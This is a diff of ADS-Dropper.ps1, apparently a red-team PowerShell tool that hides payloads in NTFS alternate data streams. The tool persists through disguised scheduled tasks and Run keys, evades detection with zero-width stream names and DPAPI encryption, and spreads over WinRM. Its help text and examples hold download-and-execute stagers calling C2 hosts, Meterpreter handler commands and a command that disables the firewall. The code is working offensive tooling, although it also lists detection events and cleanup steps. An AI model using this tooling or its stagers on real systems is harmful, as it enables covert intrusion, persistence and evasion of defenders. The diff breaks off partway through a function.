@@ -1,55 +1,122 @@
 <#
-.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry, WMI, Volume Root ADS).
-Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
-Includes AES-256 encryption, randomization, and privilege adaptation.
-.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
-Examples:
-  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
-  @('C:\payloads\imix_stager.ps1')
-  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
-.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
-- 'localhost' = Local deployment
-- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)
+.DESCRIPTION
+    ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes
+    them via JScript wrappers (zero visible PowerShell window), and persists through
+    Scheduled Tasks or Registry Run Keys.
 
-Examples:
-  -Targets @('localhost')
-  -Targets @('10.10.10.50', 'dc01.corp.local')
-.PARAMETER Persist Persistence methods (comma-separated). Default: @('task')
-Available methods:
-  task     - Scheduled Task (requires admin, logon + periodic triggers)
-  reg      - Registry Run key (works as user or admin)
-  volroot  - Volume Root ADS (requires admin, novel technique)
+    Supports any C2 framework (Realm, Metasploit, Sliver) or custom PowerShell commands.
+    Includes DPAPI machine-bound encryption, four stealth tiers (-Obfuscate), deep
+    placement in WER/Cache directories, and dual-layer AMSI bypass.
 
-Examples:
-  -Persist @('task')
-  -Persist @('task', 'reg')
-  -Persist @('volroot')
-.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
-Breaks signature-based detection but makes cleanup harder.
+    Typical workflow: Run ADS-OneLiner.ps1 on Kali to generate a one-liner, paste on
+    the Windows target. Use ADS-Dropper.ps1 directly only for local or lateral deployments.
 
-Example:
-  -Randomize
-.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
-- Key derived from machine UUID + hostname (deterministic per-system)
-- Automatically switches to PowerShell loader (VBScript can't decrypt)
-- Payload stored as Base64-encoded ciphertext
+.PARAMETER Payload
+    [REQUIRED unless -PayloadAtRuntime] The payload to deploy.
+    Accepts a PowerShell command string or a file path array: @('payload.ps1')
 
-Example:
-  -Encrypt
-.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
-Use for:
-- Pre-staging during recon phase
-- Testing deployment without triggering C2 callbacks
-- Verifying artifacts before execution
+    Examples:
+      "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
+      @('C:\payloads\imix_stager.ps1')
+      'Write-Output Beacon | Out-File C:\beacon.log -Append'
 
-Example:
-  -NoExec
-.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
-Required when -Targets includes remote hosts.
+.PARAMETER PayloadAtRuntime
+    Prompt for payload interactively at deployment time instead of baking it in.
 
-Example:
-  -Credential (Get-Credential)
-.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
+.PARAMETER Targets
+    Target hosts for deployment. Default: @('localhost')
+    Remote IPs/hostnames use WinRM (requires -Credential).
+
+    Examples:
+      -Targets @('localhost')
+      -Targets @('10.10.10.50', 'dc01.corp.local')
+
+.PARAMETER Persist
+    Persistence method. Default: 'task'
+      task     - Scheduled Task (admin required). AtLogOn + AtStartup + periodic triggers.
+      registry - Registry Run key (user or admin). HKCU + HKLM if admin. Companion task
+                 handles periodic firing.
+      none     - No persistence. ADS only, one-shot execution.
+
+.PARAMETER Obfuscate
+    Stealth tier. Controls artifact naming, file placement, and stream naming. Default: Advanced
+      None     - Fixed names (SystemOptimization task, SystemCache.dat file). Testing only.
+      Basic    - Word-list randomized names, C:\ProgramData placement. Quick deployment.
+      Advanced - Randomized names + deep WER/Cache placement + attach-to-existing. [DEFAULT]
+      Paranoid - Advanced + zero-width Unicode in stream/task names. Max stealth.
+
+    Implied settings per tier:
+      Advanced/Paranoid: Randomize=$true, UseDeepPlacement=$true, AttachToExisting=$true
+      Paranoid only:     ZeroWidthStreams=$true
+
+.PARAMETER Trigger
+    When the scheduled task fires. Accepts multiple values. Default: @('AtLogOn','AtStartup')
+    Valid values: AtLogOn, AtStartup, OnIdle, OnUnlock
+    A periodic task (every -PeriodicMinutes minutes) is ALWAYS added regardless of this setting.
+
+    Example: -Trigger @('AtLogOn','AtStartup','OnUnlock')
+
+.PARAMETER PeriodicMinutes
+    How often the periodic task fires, in minutes. Range: 1-1440. Default: 5
+
+.PARAMETER JitterPercent
+    Randomize task timing by +/- this percentage of the interval. Range: 0-50. Default: 20
+    Breaks pattern-based detection. Example: 20% of 5min = +/-1min actual fire time.
+
+.PARAMETER Randomize
+    Randomize artifact names (file, stream, task). Implied by Advanced/Paranoid tier.
+    Use explicitly to override tier behavior.
+
+.PARAMETER Encrypt
+    DPAPI machine-bound encrypt the payload in the ADS. Uses LocalMachine scope +
+    Machine GUID as additional entropy. Machine-bound: decrypts on the same machine only.
+    Payload stored as Base64-encoded DPAPI blob. No AES/SHA256 in output.
+
+.PARAMETER UseDeepPlacement
+    Place ADS host file in deep system directories (WER\Cache, Diagnosis\scheduled, etc.)
+    rather than C:\ProgramData root. Implied by Advanced/Paranoid tier.
+
+.PARAMETER AttachToExisting
+    Attach ADS to an existing legitimate system file instead of creating a new host file.
+    Implied by Advanced/Paranoid tier.
+
+.PARAMETER ZeroWidthStreams
+    Use zero-width Unicode characters (U+200B, U+200C, U+FEFF) in ADS stream names.
+    Stream names appear blank in most tools. Implied by Paranoid tier.
+    IMPORTANT: Save the manifest — you cannot type zero-width chars manually for cleanup.
+
+.PARAMETER ZeroWidthMode
+    How zero-width characters are applied to the stream name. Default: 'single'
+      single  - One zero-width char
+      multi   - 3-5 zero-width chars
+      hybrid  - Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])
+
+.PARAMETER HybridPrefix
+    Visible prefix for hybrid ZeroWidthMode (e.g., 'Zone.Identifier', 'Summary').
+
+.PARAMETER CreateDecoys
+    Create N additional benign decoy ADS streams (Zone.Identifier, Summary, etc.)
+    alongside the real payload. Range: 0-10. Default: 0
+
+.PARAMETER ManifestPath
+    Path to save the deployment manifest (JSON). Records all artifact paths, task names,
+    stream codepoints for cleanup. Default: auto-generated in current directory.
+
+.PARAMETER NoExec
+    Stage all artifacts (ADS, JScript, task/registry) without executing.
+    Use for pre-staging or testing without triggering C2 callbacks.
+
+.PARAMETER Credential
+    PSCredential for remote deployment via WinRM. Required when -Targets includes remote hosts.
+    Example: -Credential (Get-Credential)
+
+.PARAMETER GenerateOnly
+    Generate the deployment configuration object and print it, without creating any artifacts.
+    Used by ADS-OneLiner.ps1 to read configuration on Linux.
+
+.EXAMPLE
+    # Basic local deployment (unencrypted, scheduled task)
+    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
 Description:
 Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
 Creates VBScript loader at C:\ProgramData\app_log_a.vbs
@@ -57,23 +124,16 @@ Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Pro
 Executes immediately
 .EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
 Description:
-- AES-256 encrypts payload (key from UUID+hostname)
+- DPAPI encrypts payload (LocalMachine scope + Machine GUID entropy)
 - Random file: C:\ProgramData\CacheSvc.log
 - Random stream: :SmartScreen or :Zone.Identifier
 - Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
 - Random task: \Microsoft\Windows\UX\a3f5b2c1
-.EXAMPLE # Multi-method persistence (belt-and-suspenders) .\ADS-Dropper.ps1 -Payload $c2Stager -Persist @('task', 'reg') -Encrypt
+.EXAMPLE # Registry persistence .\ADS-Dropper.ps1 -Payload $c2Stager -Persist registry -Encrypt
 Description:
-Creates TWO persistence methods:
-1. Scheduled task (SYSTEM-level, periodic execution)
-2. Registry Run key (user-level, executes on logon)
-Ensures survival even if one method is detected/removed
-.EXAMPLE # Volume root ADS (novel technique, requires admin) .\ADS-Dropper.ps1 -Payload $beacon -Persist @('volroot') -Randomize
-Description:
-- Stores execution command in C:\:ads_1234 (volume root ADS)
-- Creates task: \Microsoft\Windows\Maintenance\WinSAT_567
-- Task executes: powershell -Command "Get-Content 'C:\:ads_1234' | IEX"
-- Survives directory deletions (no parent file)
+Creates registry Run key persistence:
+- HKCU Run key (logon trigger) + HKLM Run key if admin (startup trigger)
+- Companion scheduled task for periodic execution + cheeky triggers (OnIdle, OnUnlock)
 .EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
 Description:
 Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
@@ -84,7 +144,7 @@ Description:
 - Deploys to 3 remote hosts via WinRM
 - Serializes functions and executes remotely
 - Each host gets unique random artifacts (if -Randomize)
-.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist @('task', 'reg') -Encrypt -Randomize -Verbose
+.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist task -Encrypt -Randomize -Verbose
 Description:
 Full stealth deployment:
 - Encrypted Imix stager
@@ -93,19 +153,19 @@ Full stealth deployment:
 - Verbose output for verification
 .EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
 $msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
-.\ADS-Dropper.ps1 -Payload $msfPayload -Persist @('task') -Encrypt
+.\ADS-Dropper.ps1 -Payload $msfPayload -Persist task -Encrypt
 
 Description:
 Deploys Metasploit stager with encryption.
 Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
-.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist @('volroot') -Randomize -Encrypt
+.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist registry -Randomize -Encrypt
 Description:
-Deploys Sliver beacon from file with volume root persistence.
-.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist @('reg')
+Deploys Sliver beacon from file with registry Run key persistence.
+.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist registry
 Description:
 Simple persistent beacon (writes to log every 5 minutes).
 No C2 connection, useful for testing persistence without network traffic.
-.NOTES File Name : ADS-Dropper.ps1 Author : Louis (https://github.com/yourusername) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.1
+.NOTES File Name : ADS-Dropper.ps1 Author : Qweary (https://github.com/Qweary) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.4
 MITRE ATT&CK Mapping:
 - T1564.004: Hide Artifacts - NTFS File Attributes
 - T1053.005: Scheduled Task/Job
@@ -119,7 +179,7 @@ Detection:
 Cleanup:
 Run tests/cleanup.ps1 to remove all artifacts:
   .\tests\cleanup.ps1 -Targets @('localhost')
-.LINK GitHub: https://github.com/Qweary/Appartition-Delivery-System Blog: https://qweary.github.io
+.LINK GitHub: https://github.com/Qweary/Apparition-Delivery-System Blog: https://qweary.github.io
 Research Credits:
 - Oddvar Moe: https://oddvar.moe (ADS execution techniques)
 - Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
@@ -148,11 +208,16 @@ param(
     [switch]$PayloadAtRuntime,
     [string[]]$Targets = @('localhost'),
     
-    [ValidateSet('task', 'registry', 'wmi', 'none')]
+    [ValidateSet('task', 'registry', 'none')]
     [string]$Persist = 'task',
-    
-    [switch]$Randomize,
+
+    [bool]$Randomize = $false,
     [switch]$Encrypt,
+
+    # Unified obfuscation level — controls naming, placement, and ZW injection
+    [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
+    [string]$Obfuscate = 'Advanced',
+
     [switch]$ZeroWidthStreams,
     
     [ValidateSet('single', 'multi', 'hybrid')]
@@ -169,58 +234,131 @@ param(
     [switch]$Help,
     
     # Deep placement - bury ADS in legitimate Windows subdirectories
-    [switch]$UseDeepPlacement,
+    [bool]$UseDeepPlacement = $false,
     # Attach to existing file instead of creating a new host file
-    [switch]$AttachToExisting,
+    [bool]$AttachToExisting = $false,
     
+    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
+    [string[]]$Trigger = @('AtLogOn', 'AtStartup'),
+
+    # Periodic execution interval in minutes (always added to tasks)
+    [ValidateRange(1, 1440)]
+    [int]$PeriodicMinutes = 5,
+
+    # Jitter as percentage of interval — randomizes timing to break pattern detection
+    [ValidateRange(0, 50)]
+    [int]$JitterPercent = 20,
+
     [switch]$GenerateOnly
 )
 
 # Help display function
 function Show-Help {
     $helpText = @"
-â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— â•‘ ADS-Dropper v2.1 - Quick Reference â•‘ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
-REQUIRED: -Payload <string|array> Payload to deploy (command or @('file.ps1'))
-OPTIONAL: -Targets <array> Target hosts (default: @('localhost')) -Persist <array> Persistence methods: task, reg, volroot -Randomize Randomize artifacts for evasion -Encrypt AES-256 encrypt payload -NoExec Stage without executing -Credential <PSCredential> Creds for remote deployment
-QUICK START EXAMPLES:
-Local deployment (basic)
-.\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
-Full stealth (RECOMMENDED)
-.\ADS-Dropper.ps1 -Payload `$c2Stager -Encrypt -Randomize
-Multiple persistence methods
-.\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
-Lateral movement
-$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credentialâ€˜payload -Targets @('dc01') -Credential ` payloadâˆ’Targets@(â€²dc01â€²)âˆ’Credential
-PERSISTENCE METHODS:
-task Scheduled Task (admin required) â””â”€ Triggers: Logon + periodic (every 5 min) â””â”€ Path: \Microsoft\Windows\UX* or ...\UsbCeip
-reg Registry Run Key (user or admin) â””â”€ HKCU/HKLM:...\CurrentVersion\Run â””â”€ Fallback if not admin
-volroot Volume Root ADS (admin required, NOVEL) â””â”€ Stores command in C::ads_* â””â”€ No parent file, survives directory wipes
-ENCRYPTION:
--Encrypt enables AES-256 with machine-specific key (UUID+hostname)
-Pros: Prevents static analysis, evades content-based detection Cons: Requires PowerShell loader (more telemetry than VBScript)
-RANDOMIZATION:
--Randomize generates unique artifacts per deployment:
-File: SystemCache.dat -> CacheSvc.log Stream: :syc_payload -> :SmartScreen or :Zone.Identifier Loader: app_log_a.vbs -> app_log_kqmxyz.vbs Task: UsbCeip -> a3f5b2c1-... (GUID)
-C2 FRAMEWORK EXAMPLES:
-Realm C2 (Imix agent)
-$imix = Get-Content .\imix_stager.txt -Raw .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
-Metasploit
-$msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")' .\ADS-Dropper.ps1 -Payload $msf -Persist @('task')
-Sliver
-$sliver = @('C:\payloads\sliver.ps1') .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
-DETECTION & CLEANUP:
-Blue team detection: - Sysmon Event ID 15 (ADS creation) - Event ID 4698 (Task creation) - PowerShell: Get-ChildItem C:\ProgramData -Stream *
-Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
-TESTING:
-Validation suite: .\tests\validate.ps1
-Manual verification: dir /r C:\ProgramData # Show ADS schtasks /query /fo LIST # Show tasks Get-Item C::ads_* 2>$null # Check volume root
-MORE INFO:
-Full help: Get-Help .\ADS-Dropper.ps1 -Full Examples: Get-Help .\ADS-Dropper.ps1 -Examples Parameters: Get-Help .\ADS-Dropper.ps1 -Parameter *
-GitHub: https://github.com/qweary/apparition-delivery-system Blog writeup: https://qweary.github.io
-ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
+===============================================================================
+  ADS-Dropper v2.4 — Quick Reference
+  "Execution without presence"
+===============================================================================
+USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
+       .\ADS-Dropper.ps1 -Help
+
+--- WHAT DO I TYPE? (three canonical examples) --------------------------------
+
+  Fastest (local, Advanced stealth, task persistence):
+    .\ADS-Dropper.ps1 -Payload 'cmd /c netsh advfirewall set allprofiles state off'
+
+  Standard recommended (Advanced tier, encrypted, multi-trigger):
+    .\ADS-Dropper.ps1 -Payload `$payload -Obfuscate Advanced -Encrypt -Persist task ``
+      -Trigger @('AtLogOn','AtStartup','OnUnlock')
+
+  Lateral movement to remote hosts:
+    `$cred = Get-Credential
+    .\ADS-Dropper.ps1 -Payload `$payload -Targets @('dc01','web01') -Credential `$cred -Encrypt
+
+--- PAYLOAD INPUT -------------------------------------------------------------
+
+  -Payload <string>         PowerShell command string (required unless -PayloadAtRuntime)
+  -PayloadAtRuntime         Prompt for payload interactively at deployment time
+
+--- STEALTH TIER (the most important decision) --------------------------------
+
+  -Obfuscate <tier>         Controls naming, placement, stream naming. Default: Advanced
+
+    None     Fixed names (SystemOptimization task, SystemCache.dat).  [TESTING ONLY]
+    Basic    Word-list names, C:\ProgramData placement.               [Quick deployment]
+    Advanced Randomized names + WER/Cache deep placement.             [DEFAULT / CCDC]
+    Paranoid Advanced + zero-width Unicode stream/task names.         [Max stealth]
+
+  Tier-implied settings (Advanced/Paranoid imply these automatically):
+    Randomize=true, UseDeepPlacement=true, AttachToExisting=true
+    Paranoid also implies: ZeroWidthStreams=true
+
+--- PERSISTENCE ---------------------------------------------------------------
+
+  -Persist <method>         task | registry | none (default: task)
+  -Trigger <string[]>       AtLogOn, AtStartup, OnIdle, OnUnlock (default: AtLogOn+AtStartup)
+  -PeriodicMinutes <int>    Periodic task interval in minutes (default: 5, range: 1-1440)
+  -JitterPercent <int>      Timing jitter ±% of interval (default: 20, range: 0-50)
+
+  task     : Scheduled Task (admin required). JScript wrapper = zero visible PS window.
+             Fires on: configured triggers + periodic every N minutes.
+  registry : Registry Run key (user or admin). HKCU + HKLM if admin.
+             Companion scheduled task handles periodic + additional triggers.
+  none     : ADS only. One-shot execution, no re-trigger.
+
+--- EVASION ------------------------------------------------------------------
+
+  -Encrypt                  DPAPI machine-bound encrypt (LocalMachine scope + MachineGUID)
+  -Randomize <bool>         Randomize artifact names (implied by Advanced/Paranoid)
+  -UseDeepPlacement <bool>  Bury ADS in WER/Cache dirs (implied by Advanced/Paranoid)
+  -AttachToExisting <bool>  Attach to existing system file (implied by Advanced/Paranoid)
+  -NoExec                   Stage artifacts without executing (pre-staging / recon phase)
+
+--- STREAM NAMING ------------------------------------------------------------
+
+  -ZeroWidthStreams          Enable ZW Unicode chars in stream names (implied by Paranoid)
+  -ZeroWidthMode <mode>     single | multi | hybrid (default: single)
+  -HybridPrefix <string>    Visible prefix for hybrid mode (e.g., 'Zone.Identifier')
+  -CreateDecoys <int>       Add N benign decoy ADS streams alongside payload (0-10)
+
+--- REMOTE DEPLOYMENT --------------------------------------------------------
+
+  -Targets <array>          Target hosts (default: @('localhost'))
+  -Credential <cred>        PSCredential for WinRM authentication
+
+--- OTHER --------------------------------------------------------------------
+
+  -ManifestPath <path>      Where to save the cleanup manifest (JSON)
+  -GenerateOnly             Print configuration object without creating artifacts (Linux use)
+  -Help                     Show this help
+
+--- DETECTION & CLEANUP -------------------------------------------------------
+
+  Blue team detection vectors:
+    Sysmon Event 15     : ADS creation (FileCreateStreamHash)
+    Event ID 4698       : Scheduled task created
+    Event ID 4657       : Registry modification
+    PowerShell          : Get-ChildItem C:\ProgramData -Recurse | Get-Item -Stream *
+
+  Cleanup:
+    Unregister-ScheduledTask -TaskName <name> -Confirm:$false
+    Remove-ItemProperty -Path HKCU:\...\Run -Name <name>
+    Remove-Item '<hostfile>:<streamname>' -Force
+    dir /r C:\ProgramData   # cmd: shows ADS sizes
+
+--- MORE INFO ----------------------------------------------------------------
+
+  Get-Help .\ADS-Dropper.ps1 -Full
+  Full parameter reference: see QUICK-START.md
+  Red team scenarios: see tests/RED-TEAM-SHOWCASE.md
+
+  GitHub : https://github.com/Qweary/Apparition-Delivery-System
+  Blog   : https://qweary.github.io
+
+  AUTHORIZED TESTING WITH EXPLICIT PERMISSION ONLY
+===============================================================================
 "@
-Write-Host $helpText -ForegroundColor Cyan
+    Write-Host $helpText -ForegroundColor Cyan
 }
 
 # Help flag intercept
@@ -232,6 +370,20 @@ if ($Help -or $args -contains '-h' -or $args -contains '--help' -or
 }
 
 # Main Execution Logic Begins
+
+# --- Tier-implied defaults (individual params override) ---
+if ($Obfuscate -in @('Advanced', 'Paranoid')) {
+    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
+    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
+    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = $true }
+}
+if ($Obfuscate -eq 'Paranoid') {
+    if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
+}
+# Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
+if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
+    $Obfuscate = 'Paranoid'
+}
 
 #region Zero-Width Unicode Functions
 
@@ -349,6 +501,113 @@ function ConvertFrom-Codepoints {
 
 #endregion
 
+#region Obfuscation Functions
+
+# Word lists for legitimate-looking names (sourced from real Windows task/service names)
+$script:ObfTaskNames = @(
+    'WindowsDefenderScheduledScan', 'DiskCleanupTask', 'MemoryDiagnosticScheduler',
+    'NetworkListServiceUpdate', 'BackgroundIntelligentTransfer', 'TPMMaintenanceTask',
+    'CryptSvcBackup', 'LanguageComponentsInstaller', 'SpeechModelDownload',
+    'DeviceRegistrationTask', 'SystemSoundsService', 'WiredAutoConfig'
+)
+$script:ObfFunctionVerbs = @(
+    'Initialize', 'Sync', 'Update', 'Register', 'Enable',
+    'Process', 'Monitor', 'Optimize', 'Validate', 'Configure'
+)
+$script:ObfFunctionNouns = @(
+    'DriverCache', 'NetworkProfile', 'PolicyData', 'TelemetryLog',
+    'ComponentStatus', 'SecurityContext', 'SessionConfig', 'TpmBinding',
+    'CryptService', 'PerformanceHints'
+)
+$script:ObfCompanionSuffixes = @(
+    '-Monitor', '-Handler', '-Worker', '-Sync', '-Cache', '-Service', '-Helper', '-Manager'
+)
+
+function Get-ObfuscatedName {
+    <#
+    .SYNOPSIS
+        Central name generator for all obfuscated artifact names.
+    .DESCRIPTION
+        Returns appropriate names based on artifact type and obfuscation level.
+        None = current hardcoded values (backward compat).
+        Basic = static legitimate-looking name.
+        Advanced = random from word-list (unique per deployment).
+        Paranoid = Advanced + zero-width char injection (except function names).
+    #>
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateSet('FunctionGHK', 'FunctionDec', 'TaskName', 'TaskSuffix', 'RegistryValueName')]
+        [string]$Type,
+
+        [Parameter(Mandatory)]
+        [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
+        [string]$Level
+    )
+
+    # Helper: inject a zero-width char at a random interior position
+    function Add-ZeroWidthChar([string]$Name) {
+        if ($Name.Length -lt 3) { return $Name }
+        $pos = Get-Random -Minimum 1 -Maximum ($Name.Length - 1)
+        $zwChar = [char]($script:ZeroWidthChars | Get-Random)
+        return $Name.Insert($pos, $zwChar)
+    }
+
+    switch ($Type) {
+        'FunctionGHK' {
+            switch ($Level) {
+                'None'     { return 'GHK' }
+                'Basic'    { return 'Get-HostKey' }
+                # ZW chars break PS parser in function names — Advanced for Paranoid too
+                default {
+                    $verb = $script:ObfFunctionVerbs | Get-Random
+                    $noun = $script:ObfFunctionNouns | Get-Random
+                    return "$verb-$noun"
+                }
+            }
+        }
+        'FunctionDec' {
+            switch ($Level) {
+                'None'     { return 'Dec' }
+                'Basic'    { return 'Unprotect-Data' }
+                default {
+                    $verb = $script:ObfFunctionVerbs | Get-Random
+                    $noun = $script:ObfFunctionNouns | Get-Random
+                    return "$verb-$noun"
+                }
+            }
+        }
+        'TaskName' {
+            switch ($Level) {
+                'None'     { return 'SystemOptimization' }
+                'Basic'    { return $script:ObfTaskNames | Get-Random }
+                'Advanced' { return $script:ObfTaskNames | Get-Random }
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
+            }
+        }
+        'TaskSuffix' {
+            switch ($Level) {
+                'None'     { return '_Companion' }
+                'Basic'    { return $script:ObfCompanionSuffixes | Get-Random }
+                'Advanced' { return $script:ObfCompanionSuffixes | Get-Random }
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfCompanionSuffixes | Get-Random) }
+            }
+        }
+        'RegistryValueName' {
+            # Registry value name matches task name for consistency
+            # Caller should pass the same name used for TaskName
+            # This type exists for Paranoid mode ZW injection on an existing name
+            switch ($Level) {
+                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
+                default    { return Get-ObfuscatedName -Type TaskName -Level $Level }
+            }
+        }
+    }
+}
+
+#endregion
+
 #region Manifest Functions (Linux-side only)
 
 function Create-ManifestEntry {
@@ -409,66 +668,42 @@ function Save-ManifestToLinux {
 #endregion
 
 #region Payload Encryption
+# DPAPI-based machine-bound encryption. Replaces AES/SHA256 approach (BUG-011:
+# SHA256+AES+CreateDecryptor in JScript triggered Defender on-access scanner).
+# ProtectedData is used by Chrome, Edge, and Windows Credential Manager —
+# no Defender signature. LocalMachine scope means any process on this machine
+# (including SYSTEM tasks) can decrypt; copy to another machine cannot.
 
-function Get-HostDerivedKey {
-    <#
-    .SYNOPSIS
-        Derives AES-256 key from target host properties
-    #>
+function Get-DpapiEntropy {
+    # Returns Machine GUID bytes as optional DPAPI entropy — doubles machine binding
+    # without WMI or any crypto namespace call. Stable across reboots.
     try {
-        $hostInfo = @(
-            $env:COMPUTERNAME
-            (Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
-            (Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
-        ) -join '|'
-
-        $sha256 = [System.Security.Cryptography.SHA256]::Create()
-        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
-    } catch {
-        Write-Warning "Host key derivation failed, using fallback"
-        return [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
-    }
+        $g = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction SilentlyContinue).MachineGuid
+        if ($g) { return [System.Text.Encoding]::UTF8.GetBytes($g) }
+    } catch {}
+    return $null  # null = DPAPI uses machine key alone (still machine-bound)
 }
 
 function Protect-Payload {
-    <#
-    .SYNOPSIS
-        Encrypts payload with AES-256
-    #>
-    param([string]$PlainText, [byte[]]$Key)
-
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Key = $Key
-    $aes.GenerateIV()
-
-    $encryptor = $aes.CreateEncryptor()
-    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
-    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-
-    $result = $aes.IV + $encryptedBytes
-    return [Convert]::ToBase64String($result)
+    param([string]$PlainText)
+    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
+    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $entropy = Get-DpapiEntropy
+    $enc     = [System.Security.Cryptography.ProtectedData]::Protect(
+                   $bytes, $entropy,
+                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+    return [Convert]::ToBase64String($enc)
 }
 
 function Unprotect-Payload {
-    <#
-    .SYNOPSIS
-        Decrypts payload with AES-256
-    #>
-    param([string]$EncryptedData, [byte[]]$Key)
-
-    $encryptedBytes = [Convert]::FromBase64String($EncryptedData)
-
-    $aes = [System.Security.Cryptography.Aes]::Create()
